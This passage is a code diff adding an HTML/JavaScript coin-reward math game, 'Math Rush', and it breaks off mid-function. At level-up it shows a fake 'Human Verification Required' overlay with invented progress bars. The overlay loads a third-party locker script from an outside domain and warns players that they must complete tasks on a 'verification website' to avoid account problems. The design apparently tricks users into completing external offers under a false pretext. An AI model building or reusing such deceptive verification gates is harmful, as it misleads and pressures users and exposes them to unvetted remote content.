@@ -1,0 +1,1488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Math Rush | GameCoin Pro</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            /* Green Theme */
+            --primary: #10b981;
+            --primary-dark: #059669;
+            --primary-light: #34d399;
+            --primary-soft: rgba(16, 185, 129, 0.1);
+            
+            --secondary: #f8fafc;
+            --dark: #0f172a;
+            --light: #ffffff;
+            --gray: #64748b;
+            --gray-light: #e2e8f0;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --info: #0ea5e9;
+            --accent: #8b5cf6;
+            --shadow: 0 4px 20px rgba(16, 185, 129, 0.15);
+            --shadow-lg: 0 10px 40px rgba(16, 185, 129, 0.2);
+            --border-radius: 16px;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+
+        body {
+            background: linear-gradient(135deg, #022c22 0%, #064e3b 100%);
+            color: var(--dark);
+            min-height: 100vh;
+            overflow-x: hidden;
+            font-size: 14px;
+        }
+
+        .game-container {
+            max-width: 480px;
+            margin: 0 auto;
+            min-height: 100vh;
+            position: relative;
+            background: #f0fdf4;
+            box-shadow: 0 0 60px rgba(0,0,0,0.3);
+        }
+
+        /* Header */
+        .game-header {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: white;
+            padding: 15px 20px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 4px 30px rgba(16, 185, 129, 0.3);
+        }
+
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .back-btn {
+            width: 40px;
+            height: 40px;
+            border-radius: 12px;
+            background: rgba(255,255,255,0.2);
+            border: none;
+            color: white;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: var(--transition);
+        }
+
+        .back-btn:hover {
+            background: rgba(255,255,255,0.3);
+            transform: translateX(-3px);
+        }
+
+        .game-title {
+            font-size: 1.2rem;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .header-stats {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+        }
+
+        .header-stat {
+            background: rgba(255,255,255,0.15);
+            padding: 8px 14px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 0.85rem;
+            backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .header-stat i {
+            font-size: 0.9rem;
+        }
+
+        .header-stat.wallet i { color: #6ee7b7; }
+        .header-stat.coins i { color: #fde047; }
+
+        /* Level Section */
+        .level-section {
+            background: white;
+            padding: 20px;
+            border-bottom: 1px solid var(--gray-light);
+        }
+
+        .level-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .level-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 800;
+            font-size: 1.1rem;
+            color: var(--primary);
+        }
+
+        .level-badge i { color: var(--warning); }
+
+        .xp-text {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--gray);
+            font-weight: 600;
+        }
+
+        .xp-bar-bg {
+            width: 100%;
+            height: 12px;
+            background: var(--gray-light);
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .xp-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--primary-light));
+            border-radius: 10px;
+            transition: width 0.5s ease;
+            position: relative;
+            box-shadow: 0 0 10px rgba(16, 185, 129, 0.3);
+        }
+
+        .xp-bar-fill::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        /* Game Area */
+        .game-area {
+            background: linear-gradient(135deg, var(--primary-soft) 0%, white 100%);
+            padding: 30px 20px;
+            text-align: center;
+            border-bottom: 2px solid rgba(16, 185, 129, 0.1);
+            position: relative;
+        }
+
+        .timer-bar-container {
+            width: 100%;
+            height: 6px;
+            background: #e2e8f0;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            overflow: hidden;
+        }
+
+        .timer-bar {
+            height: 100%;
+            background: var(--primary);
+            width: 100%;
+            transition: width 0.1s linear;
+        }
+
+        .timer-bar.danger { background: var(--danger); }
+
+        .question-display {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: var(--dark);
+            margin-bottom: 20px;
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            letter-spacing: 2px;
+        }
+
+        .answer-input-wrapper {
+            position: relative;
+            max-width: 200px;
+            margin: 0 auto 20px;
+        }
+
+        .answer-input {
+            width: 100%;
+            padding: 15px;
+            font-size: 1.5rem;
+            font-family: 'JetBrains Mono', monospace;
+            text-align: center;
+            border: 2px solid var(--gray-light);
+            border-radius: 12px;
+            outline: none;
+            transition: var(--transition);
+            background: white;
+            color: var(--dark);
+            font-weight: 700;
+        }
+
+        .answer-input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 4px var(--primary-soft);
+        }
+
+        .feedback-msg {
+            height: 24px;
+            font-weight: 700;
+            font-size: 1rem;
+            margin-bottom: 10px;
+        }
+        .feedback-msg.correct { color: var(--success); }
+        .feedback-msg.wrong { color: var(--danger); }
+
+        /* Stats Grid */
+        .stats-section {
+            padding: 20px;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+        }
+
+        .stat-card {
+            background: white;
+            border-radius: 12px;
+            padding: 15px 8px;
+            box-shadow: var(--shadow);
+            text-align: center;
+            border: 2px solid transparent;
+            transition: var(--transition);
+        }
+
+        .stat-card:hover {
+            border-color: var(--primary);
+            transform: translateY(-2px);
+        }
+
+        .stat-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 8px;
+            font-size: 1.2rem;
+            color: white;
+        }
+
+        .stat-value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--dark);
+            margin-bottom: 2px;
+        }
+
+        .stat-label {
+            font-size: 0.7rem;
+            color: var(--gray);
+            font-weight: 600;
+        }
+
+        /* Claim Section */
+        .claim-section {
+            position: fixed;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 480px;
+            background: white;
+            padding: 20px;
+            box-shadow: 0 -5px 30px rgba(0,0,0,0.1);
+            border-top-left-radius: 20px;
+            border-top-right-radius: 20px;
+            z-index: 1000;
+        }
+
+        .claim-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, var(--success) 0%, #059669 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
+        }
+
+        .claim-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
+        }
+
+        .claim-btn:disabled {
+            background: var(--gray);
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .claim-info {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 0.8rem;
+            color: var(--gray);
+        }
+
+        /* Overlays */
+        .level-up-overlay, .verification-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 5500;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background: rgba(15, 23, 42, 0.4);
+            backdrop-filter: blur(8px) saturate(180%);
+            -webkit-backdrop-filter: blur(8px) saturate(180%);
+        }
+
+        .level-up-overlay.active, .verification-overlay.active { display: flex; }
+
+        .level-up-content, .verification-content {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: var(--border-radius);
+            padding: 40px;
+            text-align: center;
+            max-width: 380px;
+            width: 100%;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25), 0 0 0 1px rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            animation: modalPop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes modalPop {
+            0% { transform: scale(0.9) translateY(20px); opacity: 0; }
+            100% { transform: scale(1) translateY(0); opacity: 1; }
+        }
+
+        .level-up-icon {
+            width: 70px; height: 70px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #ffd700, #ffed4e);
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 2rem; color: #92400e;
+            box-shadow: 0 10px 30px rgba(245, 158, 11, 0.3);
+            animation: starBounce 0.6s ease;
+        }
+
+        @keyframes starBounce { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.2); } }
+
+        .level-up-title { font-size: 1.8rem; font-weight: 800; color: var(--dark); margin-bottom: 8px; }
+        .level-up-text { color: var(--gray); margin-bottom: 25px; font-size: 0.95rem; line-height: 1.5; }
+
+        .level-up-btn {
+            width: 100%; padding: 14px 28px;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white; border: none; border-radius: 12px;
+            font-weight: 700; cursor: pointer; font-size: 1rem;
+            transition: var(--transition);
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
+        }
+        .level-up-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4); }
+
+        /* Verification Specifics */
+        .verification-icon {
+            width: 70px; height: 70px; border-radius: 50%;
+            background: linear-gradient(135deg, var(--warning), #d97706);
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 20px; font-size: 2rem; color: white;
+            box-shadow: 0 10px 30px rgba(245, 158, 11, 0.3);
+        }
+        .verification-title { font-size: 1.5rem; font-weight: 800; color: var(--dark); margin-bottom: 8px; }
+        .verification-desc { color: var(--gray); margin-bottom: 25px; font-size: 0.9rem; line-height: 1.5; }
+        
+        .task-reminder {
+            background: linear-gradient(135deg, #fef3c7, #fde68a);
+            border-left: 4px solid var(--warning);
+            padding: 15px; border-radius: 8px;
+            margin-bottom: 20px; text-align: left;
+            display: none;
+        }
+        .task-reminder.active { display: block; animation: slideIn 0.3s ease; }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .task-reminder-title { font-weight: 700; color: var(--dark); margin-bottom: 5px; display: flex; align-items: center; gap: 8px; }
+        .task-reminder-title i { color: var(--warning); }
+        .task-reminder-text { font-size: 0.85rem; color: var(--gray); line-height: 1.4; }
+
+        /* Captcha Container */
+        .captcha-wrapper {
+            display: none;
+            margin: 20px 0;
+            padding: 20px;
+            background: #f8fafc;
+            border-radius: 12px;
+            border: 2px dashed var(--gray-light);
+        }
+        .captcha-wrapper.active { display: block; }
+        .captcha-header {
+            font-size: 0.9rem;
+            color: var(--dark);
+            font-weight: 600;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .captcha-header i { color: var(--info); }
+
+        .human-verification-wrapper {
+            display: none; margin: 20px 0; padding: 30px 20px;
+            background: #f8fafc; border-radius: 12px; border: 2px dashed var(--gray-light);
+            text-align: center;
+        }
+        .human-verification-wrapper.active { display: block; }
+
+        .loading-spinner {
+            width: 50px; height: 50px; border: 4px solid var(--gray-light);
+            border-top: 4px solid var(--success); border-radius: 50%;
+            margin: 0 auto 15px; animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .loading-dots {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 15px 0;
+        }
+        .loading-dot {
+            width: 10px;
+            height: 10px;
+            background: var(--success);
+            border-radius: 50%;
+            animation: bounce 1.4s ease-in-out infinite both;
+        }
+        .loading-dot:nth-child(1) { animation-delay: -0.32s; }
+        .loading-dot:nth-child(2) { animation-delay: -0.16s; }
+
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0); opacity: 0.5; }
+            40% { transform: scale(1); opacity: 1; }
+        }
+
+        .verification-loading-text { font-size: 0.9rem; color: var(--dark); font-weight: 600; margin-bottom: 8px; }
+        .verification-loading-subtext { font-size: 0.8rem; color: var(--gray); }
+
+        .verification-progress {
+            width: 100%; height: 8px; background: var(--gray-light);
+            border-radius: 10px; overflow: hidden; margin: 20px 0; display: none;
+        }
+        .verification-progress.active { display: block; }
+        .verification-progress-fill {
+            height: 100%; background: linear-gradient(90deg, var(--success), #34d399);
+            border-radius: 10px; width: 0%; transition: width 0.3s ease;
+        }
+        .verification-progress-text { font-size: 0.8rem; color: var(--gray); margin-top: 8px; font-weight: 600; }
+
+        .verification-buttons { display: flex; flex-direction: column; gap: 12px; }
+        .verify-btn {
+            width: 100%; padding: 14px 20px; border: 2px solid var(--primary);
+            background: white; color: var(--primary); border-radius: 12px;
+            font-weight: 700; cursor: pointer; transition: var(--transition);
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+            font-size: 0.95rem;
+        }
+        .verify-btn:hover { background: var(--primary); color: white; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(16, 185, 129, 0.2); }
+        .verify-btn.captcha { border-color: var(--info); color: var(--info); }
+        .verify-btn.captcha:hover { background: var(--info); color: white; box-shadow: 0 4px 12px rgba(14, 165, 233, 0.2); }
+        .verify-btn.human { border-color: var(--success); color: var(--success); }
+        .verify-btn.human:hover { background: var(--success); color: white; box-shadow: 0 4px 12px rgba(16, 185, 129, 0.2); }
+
+        .verification-success {
+            display: none; margin: 20px 0; padding: 20px;
+            background: #f0fdf4; border-radius: 12px; border: 2px solid var(--success);
+            text-align: center; animation: successPop 0.5s ease;
+        }
+        .verification-success.active { display: block; }
+        @keyframes successPop { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+        
+        .success-icon { width: 60px; height: 60px; border-radius: 50%; background: var(--success); display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; font-size: 2rem; color: white; }
+        .success-text { font-size: 1.1rem; font-weight: 700; color: var(--dark); margin-bottom: 5px; }
+        .success-subtext { font-size: 0.9rem; color: var(--gray); }
+
+        /* Badges */
+        .max-badge {
+            display: inline-flex; align-items: center; gap: 5px;
+            background: linear-gradient(135deg, var(--warning), #d97706);
+            color: white; padding: 4px 12px; border-radius: 20px;
+            font-size: 0.75rem; font-weight: 700; margin-left: 8px;
+        }
+        .pending-badge {
+            display: inline-flex; align-items: center; gap: 5px;
+            background: linear-gradient(135deg, var(--info), #0284c7);
+            color: white; padding: 4px 12px; border-radius: 20px;
+            font-size: 0.75rem; font-weight: 700; margin-left: 8px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
+
+        /* Toast */
+        .toast-container {
+            position: fixed; top: 100px; left: 50%; transform: translateX(-50%);
+            z-index: 4000; display: flex; flex-direction: column; gap: 8px;
+            pointer-events: none; width: 90%; max-width: 400px;
+        }
+        .toast {
+            background: rgba(255, 255, 255, 0.95); color: var(--dark);
+            padding: 14px 20px; border-radius: 12px; font-size: 0.9rem; font-weight: 600;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1); border-left: 4px solid var(--primary);
+            display: flex; align-items: center; gap: 10px;
+            animation: toastIn 0.3s ease; pointer-events: auto; backdrop-filter: blur(10px);
+        }
+        @keyframes toastIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+        .toast-icon { font-size: 1.2rem; color: var(--primary); }
+
+        /* Confetti */
+        .confetti {
+            position: absolute; width: 10px; height: 10px; background: var(--warning);
+            animation: confetti-fall 3s linear forwards;
+        }
+        @keyframes confetti-fall {
+            0% { transform: translateY(-100vh) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
+        }
+
+        .status-indicator {
+            display: inline-flex; align-items: center; gap: 6px;
+            padding: 6px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: 600; margin-top: 10px;
+        }
+        .status-indicator.processing { background: #dbeafe; color: var(--primary); }
+        .status-indicator.completed { background: #d1fae5; color: var(--success); }
+        .status-dot { width: 8px; height: 8px; border-radius: 50%; animation: blink 1.5s infinite; }
+        .status-indicator.processing .status-dot { background: var(--primary); }
+        .status-indicator.completed .status-dot { background: var(--success); animation: none; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+
+    </style>
+</head>
+<body>
+    <div class="game-container">
+        <!-- Header -->
+        <header class="game-header">
+            <div class="header-top">
+                <button class="back-btn" onclick="goBack()">
+                    <i class="fas fa-arrow-left"></i>
+                </button>
+                <div class="game-title">
+                    <i class="fas fa-calculator"></i>
+                    Math Rush
+                </div>
+                <div style="width: 40px;"></div>
+            </div>
+            <div class="header-stats">
+                <div class="header-stat wallet">
+                    <i class="fas fa-wallet"></i>
+                    <span id="mainBalance">0</span>
+                </div>
+                <div class="header-stat coins">
+                    <i class="fas fa-coins"></i>
+                    <span id="sessionEarnings">0</span>
+                </div>
+            </div>
+        </header>
+
+        <!-- Level Section -->
+        <div class="level-section">
+            <div class="level-header">
+                <div class="level-badge">
+                    <i class="fas fa-star"></i>
+                    <span>Level <span id="levelValue">1</span></span>
+                    <span id="maxBadge" class="max-badge" style="display: none;">
+                        <i class="fas fa-crown"></i> MAX
+                    </span>
+                    <span id="pendingBadge" class="pending-badge" style="display: none;">
+                        <i class="fas fa-lock"></i> PENDING
+                    </span>
+                </div>
+                <div class="xp-text">
+                    <span id="currentXp">0</span> / <span id="targetXp">100</span> XP
+                </div>
+            </div>
+            <div class="xp-bar-bg">
+                <div class="xp-bar-fill" id="xpBar" style="width: 0%"></div>
+            </div>
+        </div>
+
+        <!-- Game Area -->
+        <div class="game-area">
+            <div class="timer-bar-container">
+                <div class="timer-bar" id="timerBar"></div>
+            </div>
+            
+            <div class="question-display" id="questionDisplay">Ready?</div>
+            
+            <div class="feedback-msg" id="feedbackMsg"></div>
+
+            <div class="answer-input-wrapper">
+                <input type="number" class="answer-input" id="answerInput" placeholder="?" disabled>
+            </div>
+        </div>
+
+        <!-- Stats Grid -->
+        <div class="stats-section">
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-icon" style="background: var(--primary);">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="stat-value" id="correctCount">0</div>
+                    <div class="stat-label">Correct</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon" style="background: var(--warning);">
+                        <i class="fas fa-fire"></i>
+                    </div>
+                    <div class="stat-value" id="streakCount">0</div>
+                    <div class="stat-label">Streak</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon" style="background: var(--danger);">
+                        <i class="fas fa-times"></i>
+                    </div>
+                    <div class="stat-value" id="wrongCount">0</div>
+                    <div class="stat-label">Wrong</div>
+                </div>
+            </div>
+        </div>
+
+        <div style="height: 100px;"></div>
+    </div>
+
+    <!-- Claim Section -->
+    <div class="claim-section">
+        <button class="claim-btn" id="claimBtn" onclick="claimEarnings()" disabled>
+            <i class="fas fa-check-circle"></i>
+            Claim <span id="claimAmount">0</span> Coins
+        </button>
+        <div class="claim-info">
+            Min 50 to claim • Max 30,000 per session
+        </div>
+    </div>
+
+    <!-- Level Up Overlay -->
+    <div class="level-up-overlay" id="levelUpOverlay">
+        <div class="level-up-content">
+            <div class="level-up-icon">
+                <i class="fas fa-star"></i>
+            </div>
+            <div class="level-up-title">Level Up!</div>
+            <div class="level-up-text">
+                You reached <strong>Level <span id="newLevel">2</span></strong>!<br>
+                Problems get harder & timer gets faster!
+            </div>
+            <button class="level-up-btn" onclick="proceedToVerification()">
+                <i class="fas fa-arrow-right"></i> OK, Continue
+            </button>
+        </div>
+    </div>
+
+    <!-- Verification Overlay -->
+    <div class="verification-overlay" id="verificationOverlay">
+        <div class="verification-content">
+            <div class="verification-icon">
+                <i class="fas fa-shield-alt"></i>
+            </div>
+            <div class="verification-title">Human Verification Required</div>
+            <div class="verification-desc">
+                To unlock Level <span id="verifyLevel">2</span> and continue playing, please verify that you are human.
+            </div>
+
+            <div class="task-reminder" id="taskReminder">
+                <div class="task-reminder-title">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    Important: Complete Tasks on the Site
+                </div>
+                <div class="task-reminder-text">
+                    You must complete tasks on the verification website to avoid account problems. The timer will continue even if you leave this page.
+                </div>
+            </div>
+            
+            <!-- Captcha Container -->
+            <div class="captcha-wrapper" id="captchaContainer">
+                <div class="captcha-header">
+                    <i class="fas fa-robot"></i>
+                    Complete 1 task to get the link to verify
+                </div>
+                <div data-captcha-enable="true"></div>
+            </div>
+            
+            <!-- Human Verification Loading Section -->
+            <div class="human-verification-wrapper" id="humanVerificationWrapper">
+                <div class="loading-spinner"></div>
+                <div class="loading-dots">
+                    <div class="loading-dot"></div>
+                    <div class="loading-dot"></div>
+                    <div class="loading-dot"></div>
+                </div>
+                <div class="verification-loading-text">Verifying your humanity...</div>
+                <div class="verification-loading-subtext">Please complete the task in the opened window</div>
+                
+                <!-- Progress Bar -->
+                <div class="verification-progress active" id="verificationProgress">
+                    <div class="verification-progress-fill" id="progressFill" style="width: 0%"></div>
+                </div>
+                <div class="verification-progress-text" id="progressText">Initializing verification...</div>
+                
+                <div class="status-indicator processing" id="statusIndicator">
+                    <span class="status-dot"></span>
+                    <span id="statusText">Processing verification...</span>
+                </div>
+            </div>
+
+            <!-- Verification Success Message -->
+            <div class="verification-success" id="verificationSuccess">
+                <div class="success-icon">
+                    <i class="fas fa-check"></i>
+                </div>
+                <div class="success-text">Verification Successful!</div>
+                <div class="success-subtext">Level unlocked. Redirecting...</div>
+            </div>
+            
+            <div class="verification-buttons" id="verificationButtons">
+                <button class="verify-btn captcha" onclick="startCaptchaVerification()">
+                    <i class="fas fa-robot"></i> CAPTCHA Verification
+                </button>
+                <button class="verify-btn human" onclick="startHumanVerification()">
+                    <i class="fas fa-user-check"></i> Human Action Verification
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast Container -->
+    <div class="toast-container" id="toastContainer"></div>
+
+    <!-- Captcha Script -->
+    <script type="text/javascript" src="https://confirmapp.online/cp/js/joy6y"></script>
+
+    <script>
+        // Game State
+        const GameState = {
+            level: 1,
+            xp: 0,
+            xpToNext: 100,
+            maxLevel: 50,
+            pendingLevel: null,
+            isLocked: false,
+            verified: false,
+            
+            currentScore: 0,
+            totalEarned: 0,
+            correctAnswers: 0,
+            wrongAnswers: 0,
+            currentStreak: 0,
+            bestStreak: 0,
+            
+            gameActive: false,
+            timer: null,
+            timeLeft: 0,
+            maxTime: 0,
+            currentAnswer: 0,
+            
+            maxCoins: 30000,
+            claimed: false,
+            
+            // Verification tracking
+            verificationStartTime: null,
+            verificationTabOpen: false,
+            verificationTimer: null,
+            verificationProgress: 0,
+            isVerifying: false,
+            
+            mainAppCoins: 0
+        };
+
+        const VERIFICATION_DURATION = 4 * 60 * 1000; // 4 minutes
+        const UPDATE_INTERVAL = 1000;
+
+        // XP Table generation
+        const XP_TABLE = [];
+        for (let i = 1; i <= 50; i++) {
+            XP_TABLE.push(Math.floor(100 * Math.pow(1.2, i - 1)));
+        }
+
+        // DOM Elements
+        const els = {
+            question: document.getElementById('questionDisplay'),
+            input: document.getElementById('answerInput'),
+            timerBar: document.getElementById('timerBar'),
+            feedback: document.getElementById('feedbackMsg'),
+            correct: document.getElementById('correctCount'),
+            wrong: document.getElementById('wrongCount'),
+            streak: document.getElementById('streakCount'),
+            level: document.getElementById('levelValue'),
+            xpBar: document.getElementById('xpBar'),
+            currentXp: document.getElementById('currentXp'),
+            targetXp: document.getElementById('targetXp'),
+            claimBtn: document.getElementById('claimBtn'),
+            claimAmount: document.getElementById('claimAmount'),
+            mainBalance: document.getElementById('mainBalance'),
+            sessionEarnings: document.getElementById('sessionEarnings')
+        };
+
+        // Initialization
+        document.addEventListener('DOMContentLoaded', () => {
+            // Clear old saves
+            for(let i=1; i<=10; i++) localStorage.removeItem(`mathRush_v${i}_save`);
+            
+            window.addEventListener('storage', handleStorageChange);
+            document.addEventListener('visibilitychange', handleVisibilityChange);
+            
+            loadGameData();
+            loadMainAppData();
+            updateUI();
+            
+            // Start first question if not locked
+            if(!GameState.isLocked) {
+                startGame();
+            } else {
+                showLevelUpOverlay();
+            }
+            
+            checkOngoingVerification();
+        });
+
+        function startGame() {
+            GameState.gameActive = true;
+            els.input.disabled = false;
+            els.input.focus();
+            generateQuestion();
+        }
+
+        function generateQuestion() {
+            if(!GameState.gameActive || GameState.isLocked) return;
+
+            const level = GameState.level;
+            let num1, num2, operator, answer;
+
+            // Difficulty scaling
+            if (level <= 5) {
+                // Simple Addition
+                num1 = Math.floor(Math.random() * (10 + level * 2)) + 1;
+                num2 = Math.floor(Math.random() * (10 + level * 2)) + 1;
+                operator = '+';
+                answer = num1 + num2;
+            } else if (level <= 10) {
+                // Addition & Subtraction
+                num1 = Math.floor(Math.random() * 50) + 10;
+                num2 = Math.floor(Math.random() * 50) + 1;
+                operator = Math.random() > 0.5 ? '+' : '-';
+                if(operator === '-' && num2 > num1) [num1, num2] = [num2, num1]; // No negatives
+                answer = operator === '+' ? num1 + num2 : num1 - num2;
+            } else if (level <= 20) {
+                // Multiplication
+                num1 = Math.floor(Math.random() * (5 + level/2)) + 2;
+                num2 = Math.floor(Math.random() * 10) + 1;
+                operator = '×';
+                answer = num1 * num2;
+            } else if (level <= 30) {
+                // Division (Clean)
+                num2 = Math.floor(Math.random() * 10) + 2;
+                answer = Math.floor(Math.random() * 10) + 1;
+                num1 = num2 * answer;
+                operator = '÷';
+            } else {
+                // Mixed Hard
+                const type = Math.random();
+                if(type < 0.3) {
+                    num1 = Math.floor(Math.random() * 100) + 50;
+                    num2 = Math.floor(Math.random() * 50) + 10;
+                    operator = '+';
+                    answer = num1 + num2;
+                } else if (type < 0.6) {
+                    num1 = Math.floor(Math.random() * 20) + 10;
+                    num2 = Math.floor(Math.random() * 10) + 5;
+                    operator = '×';
+                    answer = num1 * num2;
+                } else {
+                    num1 = Math.floor(Math.random() * 500) + 100;
+                    num2 = Math.floor(Math.random() * 400) + 50;
+                    operator = '-';
+                    answer = num1 - num2;
+                }
+            }
+
+            GameState.currentAnswer = answer;
+            els.question.textContent = `${num1} ${operator} ${num2} = ?`;
+            
+            // Timer Logic: Starts at 10s, decreases by 0.1s per level, min 3s
+            const baseTime = Math.max(3000, 10000 - (GameState.level * 100));
+            GameState.maxTime = baseTime;
+            GameState.timeLeft = baseTime;
+            
+            startTimer();
+        }
+
+        function startTimer() {
+            if(GameState.timer) clearInterval(GameState.timer);
+            
+            const startTime = Date.now();
+            const maxTime = GameState.maxTime;
+            
+            GameState.timer = setInterval(() => {
+                if(!GameState.gameActive || GameState.isLocked) {
+                    clearInterval(GameState.timer);
+                    return;
+                }
+
+                const elapsed = Date.now() - startTime;
+                const remaining = maxTime - elapsed;
+                
+                if(remaining <= 0) {
+                    handleTimeout();
+                } else {
+                    const pct = (remaining / maxTime) * 100;
+                    els.timerBar.style.width = pct + '%';
+                    if(pct < 30) els.timerBar.classList.add('danger');
+                    else els.timerBar.classList.remove('danger');
+                }
+            }, 50);
+        }
+
+        function handleTimeout() {
+            clearInterval(GameState.timer);
+            GameState.currentStreak = 0;
+            GameState.wrongAnswers++;
+            showFeedback('Time Up!', 'wrong');
+            updateUI();
+            setTimeout(generateQuestion, 1000);
+        }
+
+        // Input Handling
+        els.input.addEventListener('keydown', (e) => {
+            if(e.key === 'Enter') {
+                checkAnswer();
+            }
+        });
+
+        function checkAnswer() {
+            if(!GameState.gameActive || GameState.isLocked) return;
+            
+            const val = parseInt(els.input.value);
+            if(isNaN(val)) return;
+
+            clearInterval(GameState.timer);
+            els.input.value = '';
+            els.input.blur(); // Hide mobile keyboard briefly
+
+            if(val === GameState.currentAnswer) {
+                handleCorrect();
+            } else {
+                handleWrong();
+            }
+        }
+
+        function handleCorrect() {
+            GameState.correctAnswers++;
+            GameState.currentStreak++;
+            if(GameState.currentStreak > GameState.bestStreak) GameState.bestStreak = GameState.currentStreak;
+            
+            // Score calculation: Base 10 + (Level * 2) + (Streak * 5)
+            const points = 10 + (GameState.level * 2) + (GameState.currentStreak * 5);
+            
+            // Check Max Coins
+            const remaining = GameState.maxCoins - GameState.totalEarned;
+            const addPoints = Math.min(points, remaining);
+            
+            GameState.currentScore += addPoints;
+            GameState.totalEarned += addPoints;
+            
+            showFeedback('Correct!', 'correct');
+            addXP(Math.floor(addPoints * 0.8)); // XP gain
+            
+            updateUI();
+            
+            if(GameState.totalEarned >= GameState.maxCoins) {
+                endGame();
+            } else {
